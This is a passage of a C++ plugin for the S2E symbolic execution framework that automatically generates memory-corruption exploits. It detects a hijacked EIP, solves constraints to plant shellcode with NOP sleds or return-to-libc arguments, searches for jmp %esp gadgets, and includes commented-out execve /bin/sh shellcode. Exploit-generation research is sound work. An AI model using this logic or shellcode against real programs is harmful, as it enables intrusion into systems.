/*
 * S2E Selective Symbolic Execution Framework
 *
 * Copyright (c) 2010, Dependable Systems Laboratory, EPFL
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 *       notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 *       notice, this list of conditions and the following disclaimer in the
 *       documentation and/or other materials provided with the distribution.
 *     * Neither the name of the Dependable Systems Laboratory, EPFL nor the
 *       names of its contributors may be used to endorse or promote products
 *       derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE DEPENDABLE SYSTEMS LABORATORY, EPFL BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * Currently maintained by:
 *    Vitaly Chipounov <vitaly.chipounov@epfl.ch>
 *    Volodymyr Kuznetsov <vova.kuznetsov@epfl.ch>
 *
 * All contributors are listed in S2E-AUTHORS file.
 *
 */
extern "C" {            
#include "config.h"     
#include "qemu-common.h"
//#include <fmtb.h> // The library that generates format string.
}                       


#include "Exploit.h"
#include <s2e/S2E.h>
#include <s2e/ConfigFile.h>
#include <s2e/Utils.h>

#include <iostream>

#include <klee/Solver.h>
#include <s2e/S2EExecutor.h>    
#include <s2e/S2EExecutionState.h>

#include <iostream> 
#include <fstream> 
#include <vector> 
#include <utility> 
//#include <iomanip>

#include <sys/times.h>
#include <time.h>
#include <unistd.h>
#include <iomanip>


bool my_sort(const std::pair<uint32_t,uint32_t> a,const std::pair<uint32_t,uint32_t> b)
{
  return a.second > b.second;
}


namespace s2e {
  namespace plugins {

    S2E_DEFINE_PLUGIN(Exploit, "Expoit S2E plugin", "",);

    void Exploit::initialize()
    {
      type = s2e()->getConfig()->getInt(getConfigKey() + ".Type");
      shellcode = s2e()->getConfig()->getString(getConfigKey() + ".Shellcode");
      tainted_address = s2e()->getConfig()->getInt(getConfigKey() + ".TaintedAddress");

    
      std::cout << "* Exploit * Concolic mode : " << s2e()->getExecutor()->getConcolicMode() << std::endl;
      std::cout << "* Exploit * Exploit type : " << type << std::endl;
      //const char *text = shellcode.data();
      //std::cout << "shellcode : " << shellcode.c_str() << std::endl;
      //const char *sh = shellcode.c_str();
      //const char *ptr = NULL;
      //ptr = strtok(sh,"x");
      //while(ptr != NULL)
      //{
      //std::cout << ptr << std::endl;
      //ptr = strtok(NULL,"x");
      //}
      //m_traceBlockExecution = s2e()->getConfig()->getBool(
      //getConfigKey() + ".traceBlockExecution");
      s2e()->getCorePlugin()->onCorruptEip.connect(
	  sigc::mem_fun(*this, &Exploit::onCourruptEip));
    }

    void Exploit::onCourruptEip(S2EExecutionState *s, klee::ref<klee::Expr> value, klee::ref<klee::Expr> target, bool isWrite)
    {

      s->middle = times(&(s->t_middle));

      klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (target);

      uint64_t target_address = 0;


      //int where = 0;

      if(CE != NULL)
      {
	target_address = CE->getZExtValue();
	if(target_address ==(uint64_t) s->eip)
	{  
	  s2e()->getWarningsStream(s) << "[*] Eip is corrupted. vaule: " << value << " target: " << " EIP: " << std::hex << s->getPc() << std::endl; 
	  where = 1;
	}
	else if(target_address ==(uint64_t) s->ebp)
	{
	  s2e()->getWarningsStream(s) << "[*] Ebp is corrupted. vaule: " << value << " target: " << " EIP: " << std::hex << s->getPc() << std::endl;
	  where = 2; 
	}
	else if(target_address ==(uint64_t) s->esp)
	{
	  s2e()->getWarningsStream(s) << "[*] Esp is corrupted. vaule: " << value << " target: " << " EIP: " << std::hex << s->getPc() << std::endl; 
	  where = 3;
	}
      }
      else
      {
	//value = klee::ZExtExpr::create(value, klee::Expr::Int32); 
	s2e()->getWarningsStream(s) << "[*] symbolic pointer(index) is corrupted. vaule: " << value << " target: " << target << " isWrite: " << isWrite << " EIP: " << std::hex << s->getPc() << std::endl; 
	where = 4;
      }

      /*
	 if(s2e()->getExecutor()->getConcolicMode() && where == 1)
	 {
	 s->constraints.erase(s->constraints.getConcolicSize());
	 s->constraints.setConcolicSize(0);
	 }
       */
      //s2e()->getWarningsStream(s) << "[*] Plugin start." << std::endl;
      //s->dumpStack(40,s->getSp());             
      //s->dumpX86State(s2e()->getWarningsStream()); 

      eip_value = value;
      //s2e()->getWarningsStream(s) << "[Exploit]  Add Constraints." << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  register. " << s->getSymbolicRegistersMask() << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  eip. " << std::hex << s->getPc() << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  value. " << value.get() << std::endl;

      //s->dumpStack(128,s->getSp()-64);

      //s2e()->getWarningsStream(&s) << s2e()->getOutputFilename("exploit.txt") << std::endl;

      //s->addConstraint(klee::EqExpr::create(value, klee::ConstantExpr::alloc(0xaabbccff,klee::Expr::Int32)));

      //      klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32));
      //klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32), klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32));
      //s->addConstraint( klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32)));
      //bool res;
      //      klee::Solver::Validity res;
      //      klee::Query query(s->constraints, new_eip);//klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32)));

      //klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr>(query.expr);
      //s2e()->getWarningsStream(s) << "query? " << E << std::endl;
      //s2e()->getExecutor()->getSolver()->mustBeFalse(query, res);
      //      s2e()->getExecutor()->getSolver()->evaluate(query, res);
      //      s2e()->getWarningsStream(s) << "[*] true? " << res << std::endl;
      //s2e()->getExecutor()->getSolver()->mustBeTrue(query, res);
      //  s->addConstraint(new_eip);
      //if(0)

      //int num = 0;
      if(where == 1 /*target_address ==(uint64_t) s->eip*/)
      {
	char name[20];
	if(/*testPointer(s, s->constraints, eip_value, 0xffffffff) &&*/ insertShellcode(s))//res != klee::Solver::False)
	  //if(1)
	{ 

	  //s->addConstraint(new_eip);
	  //uint32_t address;
	  //insertShellcode(s, value);
	  //klee::ref<klee::Expr> eip =  klee::EqExpr::create(value, klee::ConstantExpr::alloc(address ,klee::Expr::Int32));
	  //s->addConstraint(new_eip);

	  //ConcreteInputs out;                                                  
	  //bool success = s2e()->getExecutor()->getSymbolicSolution(*s, out);
	  //if(success)
	  //{



	  sprintf(name,"Exploit_%d.txt",num);
	  num++;
	  genExploit(s, name);
	  /*
	     char * path = const_cast<char*> ( s2e()->getOutputFilename(name).c_str());
	     std::ofstream fout(path, std::ios::out | std::ios::binary);

	     ConcreteInputs::iterator it;                                                                             
	     for (it = out.begin(); it != out.end(); ++it) {                                                          
	     const VarValuePair &vp = *it;                                                                        
	  //    s2e()->getMessagesStream() << vp.first << ": ";                                                      

	  for (unsigned i=0; i<vp.second.size(); ++i) {
	  fout.put((unsigned) vp.second[i]);                                                        
	  //s2e()->getMessagesStream() << (unsigned) vp.second[i] << ' ';                                   
	  }                                                                                                    
	  }                                                                                                        
	  fout.close(); 
	  }

	  s2e()->getWarningsStream(s) << "[*] Generated Exploit. (" << name << ")"<< std::endl;
	  exit(0);*/
          return;
	}

        s2e()->getWarningsStream(s) << "[***] Cannot gnenrate exploit, remove all constants and try again" << std::endl;
        s->constraints.erase(s->constraints.size());
        //s->addConstraint(s->constraints.getNoZeroConstraints());
        if(insertShellcode(s))
        {
          genExploit(s, "Exploit_maybe.txt");
        }

	s2e()->getExecutor()->terminateStateEarly(*s,"Exploit plugin terminate");
      }
      else if(where == 2)
      {
/*
	std::vector<std::pair<uint32_t,uint32_t> > sym_table = searchStack(s);
	if(sym_table.begin() != sym_table.end())
	{
	  klee::ref<klee::Expr> toEbp = klee::EqExpr::create(value, klee::ConstantExpr::create(sym_table.begin()->first, klee::Expr::Int32));
	  bool res;
	  s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(s->constraints, toEbp), res);
          //s2e()->getWarningsStream(s) << "bsp res : " <<res << std::endl; 
	  if(res == true)                                                                       
	    s->addConstraint(toEbp);                                                            

	}
*/

      }
      else if(where == 4)
      {
	if(isWrite == 1 && !isa<klee::ConstantExpr>(value) )
	{
	  //s->dumpStack(20,s->getSp());
/*
	  eip_value = value.get()->getKid(0); 
	  klee::ref<klee::Expr> toRet = klee::EqExpr::create(target, klee::ConstantExpr::create(s->getBp()+4, klee::Expr::Int64)); //0x08049650
	  bool res;   
	  s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(s->constraints, toRet), res);     
	  if(res == true)                                
	  {  
            s->addConstraint(toRet);
          } 
	  else
	    return;

	  if(insertShellcode(s))// Don't jump to heap!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	  {
	    char name[20];                     
	    sprintf(name,"Exploit_%d.txt",num);
	    num++;                             
	    genExploit(s, name);               
	  }
	  return;
*/
	}
        else if (isWrite == 1 && isa<klee::ConstantExpr>(value) )
        {
/*

          std::vector<unsigned char> shellCodeVector = getShellcode(s, shellcode);
          std::vector<std::pair<uint32_t,uint32_t> > sym_table = searchStack(s);

          uint32_t address = sym_table.begin()->first + sym_table.begin()->second - shellCodeVector.size();

          target = klee::ZExtExpr::create(target, klee::Expr::Int32);
          s2e()->getWarningsStream(s) << "target : " << target << std::endl;


//s->dumpStack(40,0xB7FB6A80 - 20);             
//s->dumpX86State(s2e()->getWarningsStream()); 

          char kk[100];
          string_t ttt;
          ttt.base = 0;
          ttt.offset = 7;
          ttt.locaddr = 0x08049614;
          ttt.retaddr = address+4;
          ttt.fmt = kk;
          int size = build_n(&ttt);

          size = 0;
          while(kk[size] != '\0')
            size++;

          s2e()->getWarningsStream(s) << "fmt size : " << size << " address : " << address << std::endl;

          klee::ConcatExpr *CE = dyn_cast<klee::ConcatExpr> (target);
          if(CE != NULL)
          {
          //s->constraints.erase(s->constraints.size());
          klee::ref<klee::Expr> all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);
          
          bool res = 0;

          while(res == 0)
          {
            klee::ref<klee::Expr> temp = klee::ConstantExpr::create(0x1,klee::Expr::Bool);
            for(int i=0 ; i<shellCodeVector.size() ; i++)
            {
              klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( s->readMemory8(address + i), klee::ConstantExpr::create(shellCodeVector[i] ,klee::Expr::Int8));
              temp = klee::AndExpr::create(temp, one_byte);                                                  
            }
            s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(s->constraints, temp), res);
            if(res == 0)
              address--;
          }
          for(int i=0 ; i<shellCodeVector.size() ; i++)
          {
            klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( s->readMemory8(address + i), klee::ConstantExpr::create(shellCodeVector[i] ,klee::Expr::Int8));
            all = klee::AndExpr::create(all, one_byte);                                                  
          }

          klee::ref<klee::Expr> first = s->readMemory8(address);
          klee::ref<klee::Expr> index = klee::ConstantExpr::create(size ,klee::Expr::Int32);
          int nop_num = 0;
          while(first.compare(CE->getLeft()->rebuild(&index)))
          {
            klee::ref<klee::Expr> ss = klee::EqExpr::create(klee::ConstantExpr::create(0x90,klee::Expr::Int8), CE->getLeft()->rebuild(&index));
            all = klee::AndExpr::create(all, ss);
            size++;
            nop_num++;
            index = klee::ConstantExpr::create(size ,klee::Expr::Int32);
          }

          ttt.retaddr = address - (nop_num/2);
          build_n(&ttt);
          //int i; 
          for(int i=0 ; kk[i] != '\0' ; i++)
          {
            klee::ref<klee::Expr> index = klee::ConstantExpr::create(i ,klee::Expr::Int32);
            klee::ref<klee::Expr> ss = klee::EqExpr::create(klee::ConstantExpr::create((unsigned char)kk[i],klee::Expr::Int8), CE->getLeft()->rebuild(&index));
            all = klee::AndExpr::create(all, ss);           
          //s->addConstraint(ss);
            
          }


//          klee::ConstraintManager cm(s->constraints);
//          cm.addConstraint(all);

          s->addConstraint(all);

          char name[20];                     
          sprintf(name,"Exploit_%d.txt",num);
          num++;                             
          genExploit(s, name);               

          }
*/
        }
	  else if(isWrite == 0)
	  {

            //s2e()->getWarningsStream(s) << "sss: " << s->constraints.getConcolicConstraints()->getNumKids() << std::endl;
/*
            std::vector<std::pair<uint32_t,uint32_t> > sym_table = searchStack(s);
            target = klee::ZExtExpr::create(target, klee::Expr::Int32);
            klee::ref<klee::Expr> toSym = klee::EqExpr::create(target, klee::ConstantExpr::create(sym_table.begin()->first, klee::Expr::Int32));
	     bool res;
	     s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(s->constraints, toSym), res); 
s2e()->getWarningsStream(s) << "res : " << res << std::endl;
	     if(res)
             { 
               s->addConstraint(toSym);
            std::vector< klee::ref<klee::Expr> >::iterator it;

            for(it=s->constraints.concolic_constraints.begin() ; it!=s->constraints.concolic_constraints.end() ; it++)
            {
              bool rr;
              s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(s->constraints, *it), rr);
              if(!rr)
              {
                s->constraints.concolic_constraints.erase(it);
                //s->constraints.addConcolicConstraints(toSym);;
                it--;
                //break;
              }
            }
                s->constraints.addConcolicConstraints(toSym);;


             }
*/

/*
	    klee::ref<klee::Expr> toSym = klee::EqExpr::create(((target.get()->getKid(0)).get()->getKid(1)).get()->getKid(0), klee::ConstantExpr::create(0xfffffffc ,klee::Expr::Int32));
	    s->addConstraint(toSym);
	    s2e()->getWarningsStream(s) << "kid : " << ((target.get()->getKid(0)).get()->getKid(1)).get()->getKid(0) << std::endl;
*/
//            std::vector< klee::ref<klee::Expr> >::iterator it;
//            for(it = s->constraints.concolic_constraints.begin() ; it != s->constraints.concolic_constraints.end() ; it++)
//              s2e()->getWarningsStream(s) << *it << std::endl;

//            s2e()->getWarningsStream(s) << "===================================" << std::endl; 


 //           for(it = s->constraints.concolic_constraints.begin() ; it != s->constraints.concolic_constraints.end() ; it++)
 //             s2e()->getWarningsStream(s) << *it << std::endl;
	  }

	  /*
	     if(type==1 || type == 3)
	     {
	     uint32_t start, size;
	     getDataSeg(s, &start, &size);
	     s2e()->getWarningsStream(s) << "start: " << start << " size: " << size << std::endl;
	     uint32_t virtualAddress = start;
	     uint64_t hostAddress = 0;            

	     while(hostAddress !=  (uint64_t) -1 && virtualAddress <= start+size)
	     {
	     hostAddress =  s->getHostAddress(virtualAddress);
	     if(hostAddress !=  (uint64_t) -1)              
	     {
	     klee::ObjectPair op = s->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);                                                                                      
	     s2e()->getDebugStream(s) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

	     unsigned int size = op.second->size;
	     unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);                                                                                                                   
	     virtualAddress = virtualAddress - offset;                                                                                                                                     
	     for(unsigned int j=offset ; j<size && virtualAddress+j <= start+size ; j++)
	     {
	     if(op.second->isByteConcrete(j))
	     {
	     klee::ref<klee::Expr> toData = klee::EqExpr::create(target, klee::ConstantExpr::create(virtualAddress+j ,klee::Expr::Int64));
	     bool res;
	     s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(s->constraints, toData), res); 
	     if(res)
	     s->addConstraint(toData);
	     hostAddress = (uint64_t)-1;
	     break;

	     }
	     }
	     }      

	     }
	     }
	   */ 
	}
	}

	bool Exploit::insertShellcode(S2EExecutionState *state)
	{

	  //s2e()->getWarningsStream(state) << "shellcode " << shellcode << std::endl;  
	  //char code[] = "\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

	  // for(std::vector<unsigned char>::iterator it = shellCodeVector.begin() ; it != shellCodeVector.end() ; it++)
	  // {
	  //   s2e()->getWarningsStream(state) << std::hex<< (int)*it << std::endl;
	  //printf("%x\n",*it);
	  // }
	  //s2e()->getWarningsStream(state) << "shell size: " << shellCodeVector.size() << std::endl;
	  //s2e()->getWarningsStream(state) << "[*] ----> Search for memory. size(" << shellCodeVector.size() << ")"<< std::endl;
	  if(type == 1) // return to satck
	  {
	    std::vector<unsigned char> shellCodeVector = getShellcode(state, shellcode);

	    s2e()->getWarningsStream(state) << "[*] Insert Shellcode (" << shellCodeVector.size() << " bytes)" << std::endl;
	    std::vector<std::pair<uint32_t,uint32_t> > sym_table;

	    uint32_t shellCode_start; 
	    int nop_size;

	    sym_table = searchDataOrHeap(state, true /*Data*/);
	    //sym_table = searchStack(state);
	    //s2e()->getWarningsStream(state) << " Data segment : " << std::endl;
	    nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, eip_value, 0x90, "Data", &shellCode_start);
	    if(nop_size != -1)
	    {
	      //s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  addr << " nopsize: "<< std::dec << nop_size << std::endl;
	      addConstraints(state, shellCode_start, shellCodeVector, eip_value, shellCode_start, 0x90, nop_size);
	      return true;
	    }
	    /////////////////////////////////////////////////////////////////

	    //sym_table = searchStack(state);
	    sym_table = searchDataOrHeap(state, false /*Heap*/);
	    //s2e()->getWarningsStream(state) << " Heap : " << std::endl;
	    nop_size =getMaxNopAndAddr( state, shellCodeVector, sym_table, eip_value, 0x90, "Heap", &shellCode_start);

	    if(nop_size != -1)
	    {
	      //	s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  shellCode_start << " nopsize: "<< std::dec << nop_size << std::endl;
	      addConstraints(state, shellCode_start, shellCodeVector, eip_value, shellCode_start, 0x90, nop_size);
	      return true;
	    }

	    ///////////////////////////////////////////////////////////////////
	    sym_table = searchStack(state);
	    //s2e()->getWarningsStream(state) << " Stack : " << std::endl;
	    nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, eip_value, 0x90, "Stack", &shellCode_start);

	    if(nop_size != -1)
	    {
	      //	s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  shellCode_start << " nopsize: "<< std::dec << nop_size << std::endl;
	      addConstraints(state, shellCode_start, shellCodeVector, eip_value, shellCode_start, 0x90, nop_size);
	      return true;
	    }
	    /*
	       std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin();
	     *address = it->first;

	     int i;
	     for(i=0 ; i<28 ; i++)
	     {
	     klee::ref<klee::Expr> shell =  klee::EqExpr::create( state->readMemory8(*address + i) , klee::ConstantExpr::alloc(code[i] ,klee::Expr::Int8));
	     state->addConstraint(shell);
	     }
	     */
	    return false;
	  }
	  else if(type == 2) // return to libc
	  {

	    //s2e()->getMessagesStream(state) << "EBP: " << state->getBp() << std::endl;
	    //dumpStack(20,state->getSp());  
	    //state->dumpStack(40,state->getSp());
	    //state->dumpX86State(s2e()->getWarningsStream());

	    std::vector<unsigned char> shellCodeVector;

	    char *c_shellcode = new char [shellcode.size() + 1];          

	    strcpy(c_shellcode, shellcode.c_str());

	    for(unsigned int i=0 ; i<= strlen(c_shellcode) ; i++)
	    {
	      shellCodeVector.push_back(*(c_shellcode + i));
	      //s2e()->getMessagesStream(state) << "shellcode: " << *(c_shellcode + i) << " "<<  std::hex << *(c_shellcode + i) << std::endl;
	      printf("%x\n",*(c_shellcode + i));
	    }
	    //shellCodeVector.push_back(strtol(' ', NULL, 16));

	    //for(unsigned int i=0 ; i< shellCodeVector.size() ; i++)
	    //s2e()->getMessagesStream(state) << "shellcode: " <<  shellCodeVector[i] << std::endl;

	    //uint64_t hostAddress =  state->getHostAddress(state->getSp() + 4); 
	    //if(hostAddress !=  (uint64_t) -1         //{
	    //klee::ObjectPair op = stateaddressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
	    //unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);

	    //if(op.second->isByteKnownSymbolic(offset) && 
	    //   op.second->isByteKnownSymbolic(offset + 1) &&
	    //   op.second->isByteKnownSymbolic(offset + 2) &&
	    //   op.second->isByteKnownSymbolic(offset + 3) )
	    if(testPointer(state,  state->constraints, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0xffffffff))
	    {
	      s2e()->getMessagesStream(state) << "check : address : " << std::hex << state->getSp() +4 << " value: "<< state->readMemory(state->getSp() + 4, klee::Expr::Int32)<< std::endl;

	      std::vector<std::pair<uint32_t,uint32_t> > sym_table;
	      int nop_size;
	      uint32_t shellCode_start;

	      sym_table = searchDataOrHeap(state, true /*Data*/); 
	      nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0x20, "Data", &shellCode_start);

	      if(nop_size != -1)
	      {
		addConstraints(state, shellCode_start, shellCodeVector, state->readMemory(state->getSp() + 4, klee::Expr::Int32), shellCode_start, 0x20, nop_size);
		return true;
	      }          

	      sym_table = searchDataOrHeap(state, false /*Heap*/);     

	      nop_size =getMaxNopAndAddr( state, shellCodeVector, sym_table, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0x20, "Heap", &shellCode_start);                                 

	      if(nop_size != -1)                                                                                                                         
	      {                                                                                                                                          
		addConstraints(state, shellCode_start, shellCodeVector, state->readMemory(state->getSp() + 4, klee::Expr::Int32), shellCode_start, 0x20, nop_size);                         
                return true;                                                                                                                             
	      }                                                                                                                                           

	      sym_table = searchStack(state);       
    
                                                                                                     
	      nop_size = getMaxNopAndAddr(state, shellCodeVector, sym_table, state->readMemory(state->getSp() + 4, klee::Expr::Int32), 0x20, "Stack", &shellCode_start);                     
	      if(nop_size != -1)                                                                                                                         
	      {                                                                                                                                          
		addConstraints(state, shellCode_start, shellCodeVector, state->readMemory(state->getSp() + 4, klee::Expr::Int32), shellCode_start, 0x20, nop_size);                         
                return true;                                                                                                                             
	      }                                                                                                                                          


	    }
	    else
	    {
	      s2e()->getMessagesStream(state) << "argument location cannot tained." << std::endl;
	      //return false;
	    }
	    return false;
	    //}
	  }
	  else if (type == 3) // jmp to esp
	  {
            s2e()->getWarningsStream(state) << "Exploit type : return to register" << std::endl;
	    state->dumpStack(40,state->getSp()-60);
	    state->dumpX86State(s2e()->getWarningsStream());
	    /*
	       std::vector<unsigned char> shellCodeVector = getShellcode(state, shellcode);    
	       std::vector<std::pair<uint32_t,uint32_t> > sym_table;  
	       sym_table = searchStack(state);

	       std::vector<std::pair<uint32_t,uint32_t> >::iterator it;
	       for(it = sym_table.begin() ; it != sym_table.end() ; it++)
	       {
	       s2e()->getMessagesStream(state) << "jjjjjj: " << it->first << " == " << state->getSp() << std::endl;
	       if(it->first == state->getSp() && it->second >= shellCodeVector.size())
	       break;
	       }
	       if(it == sym_table.end())
	       return false;
	     */      


	    uint32_t data_start, data_size;
	    getDataSeg(state, &data_start, &data_size);

	    //s2e()->getMessagesStream(state) << "start+size = " << std::hex << data_start+data_size << std::endl;


	    bool get_ff = false;
	    uint32_t virtualAddress = 0x08048000;
	    uint64_t hostAddress = 0;
	    uint32_t ffe4_address = 0;
	    uint32_t ffd0_address = 0;
	    //s2e()->getMessagesStream(state) << "start + data : " << data_start + data_size << std::endl;
	    while(hostAddress != (uint64_t)-1 && virtualAddress <= data_start+data_size)
	    {
	      hostAddress = state->getHostAddress(virtualAddress);
	      if(hostAddress != (uint64_t) -1)
	      {
		klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK); 
		unsigned int size = op.second->size;
		unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
		virtualAddress = virtualAddress - offset;

		for(unsigned int i=offset ; (i < size) && (virtualAddress+i <= data_start+data_size) ; i++)
		{
		  klee::ref<klee::Expr> value = op.second->read8(i);
		  klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (value);

		  if(CE != NULL  && CE->getZExtValue(8) == 0xff)
		  {
		    //s2e()->getMessagesStream(state) << "maaayyyyyy beeee!!!!" << std::endl;
		    get_ff = true;
		  }
		  else if(CE != NULL && CE->getZExtValue(8) == 0xe4 && get_ff == true)
		  {  
		    s2e()->getWarningsStream(state) << "jmp %esp (0xffef) address : " << std::hex << virtualAddress + i -1 << std::endl;
		    ffe4_address = virtualAddress + i - 1;
		    hostAddress = (uint64_t) -1;
		    break;
		  }
		  else if(CE != NULL && CE->getZExtValue(8) == 0xd0 && get_ff == true)
		  {  
		    s2e()->getWarningsStream(state) << "call %eax (0xffd0) address : " << std::hex << virtualAddress + i -1 << std::endl;
		    s2e()->getWarningsStream(state) << std::hex << state->getEax() << std::endl;
		    ffd0_address = virtualAddress + i - 1;
		    hostAddress = (uint64_t) -1;
		    break;
		  }              
		  else
		  {
		    get_ff = false;
		  }
		  //s2e()->getMessagesStream(state) << std::hex<<"address: " << virtualAddress + i <<" offset: " << i << " value: "<< std::hex<< (CE->getZExtValue(8) ) << std::endl;
		}

	      }
	      virtualAddress = virtualAddress + 128 ;
	    }

	    std::vector<unsigned char> shellCodeVector = getShellcode(state, shellcode);

	    if(ffe4_address != 0 && -1 != testShellcode(state, state->getSp(), shellCodeVector, state->constraints, eip_value, ffe4_address, state->getSp(), 0))//testPointer(state, state->constraints, eip_value, ffe4_address))
	    {
	      //s2e()->getMessagesStream(state) << "OOOOOOOOOOOOOOOOOOOOOOOKKKKKKKKKKK! " << std::endl;
	      addConstraints(state, state->getSp(), shellCodeVector, eip_value, ffe4_address, 0, 0);
	      return true;
	    }
	    else if(ffd0_address != 0 && -1 != testShellcode(state, state->getAx(), shellCodeVector, state->constraints, eip_value, ffd0_address, state->getAx(), 0))
	    {
	      //s2e()->getMessagesStream(state) << "OOOOOOOOOOOOOOOOOOOOOOOKKKKKKKKKKK! " << std::endl;
	      addConstraints(state, state->getAx(), shellCodeVector, eip_value, ffd0_address, 0, 0);
	      return true;
	    }
	    //s2e()->getMessagesStream(state) << "NNNNNNNNNNNNNNNNNOOOOOOOOOOO!!!! "<< std::endl;
	    std::vector<std::pair<uint32_t,uint32_t> > sym_table;
	    sym_table = searchDataOrHeap(state, true /*Data*/);

	    for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)
	    {
	      //s2e()->getMessagesStream(state) << "first: " << it->first << " second: " << it->second << std::endl;
	      if(it->second >= 2)
	      {
		for(unsigned int i=1 ; i<it->second ; i++)
		{
		  klee::ConstraintManager cm = state->constraints;
		  klee::ref<klee::Expr> byte1 = klee::EqExpr::create(state->readMemory8(it->first + i -1), klee::ConstantExpr::create(0xff, klee::Expr::Int8));
		  klee::ref<klee::Expr> byte2 = klee::EqExpr::create(state->readMemory8(it->first + i), klee::ConstantExpr::create(0xe4, klee::Expr::Int8));
		  klee::ref<klee::Expr> ffe4_expr = klee::AndExpr::create(byte1, byte2);
		  //klee::Query query(state->constraints, byte3);
		  //klee::Solver::Validity res;
		  //s2e()->getExecutor()->getSolver()->evaluate(query, res);
		  cm.addConstraint(ffe4_expr);
		  if(/*res != klee::Solver::False &&*/ -1 != testShellcode(state, state->getSp(), shellCodeVector, cm, eip_value, it->first +i -1, state->getSp(), 0))
		  {
		    state->addConstraint(ffe4_expr);
		    addConstraints(state, state->getSp(), shellCodeVector, eip_value, it->first+i-1, 0, 0); 
		    return true;
		  }
		}
	      }
	    } 
	    return false;
	  }
	  //   else
	  return false;
	}

	std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchStack(S2EExecutionState *state)
	{

	  std::vector<std::pair<uint32_t,uint32_t> > sym_table;

	  //uint32_t virtualAddress = state->getSp();
	  uint32_t virtualAddress = 0xbfffffff;
	  //uint32_t virtualAddress = 0x40000000;

	  uint64_t hostAddress = 0;

	  //std::vector<std::pair<uint32_t,uint32_t> >::iterator split;
	  //for(int i=0 ; i<5 ; i++)
	  while(hostAddress !=  (uint64_t) -1)
	    //while(virtualAddress >= 0x08048000)
	  {   
	    hostAddress =  state->getHostAddress(virtualAddress);
	    if(hostAddress !=  (uint64_t) -1) 
	    {   
	      klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
